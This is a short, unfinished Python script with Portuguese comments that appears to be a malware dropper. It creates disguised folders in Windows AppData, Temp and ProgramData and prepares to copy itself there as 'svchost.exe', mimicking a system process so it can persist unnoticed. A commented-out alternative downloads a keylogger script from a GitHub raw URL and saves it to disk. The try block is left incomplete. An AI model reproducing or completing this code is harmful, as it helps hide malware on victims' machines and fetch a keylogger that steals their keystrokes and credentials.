import os
import requests 
from dotenv import load_dotenv
import sys
import shutil

FAKE_NAME = 'svchost.exe'

DIRS = [
    os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\svchost"),
    os.path.join(os.getenv('LOCALAPPDATA'), r"Temp\WinUpdate"),
    os.path.join(os.getenv('PROGRAMDATA'), r"SystemService"),
]

exe_path = sys.executable
for pasta in DIRS:
    try:
        os.makedirs(pasta, exist_ok=True)
        destino = os.path.join(pasta, FAKE_NAME)


#import requests --- SEGUNDA OPÇÃO ---

#url = 'https://raw.githubusercontent.com/xinaiderf/keylogger/main/main.py'
#saida = 'meuarquivo.py'  # nome que você quer salvar

#resp = requests.get(url)
#if resp.status_code == 200:
#    with open(saida, 'wb') as f:
#        f.write(resp.content)
#    print(f"Arquivo salvo como {saida}")
#else:
#    print(f"Erro ao baixar: {resp.status_code}")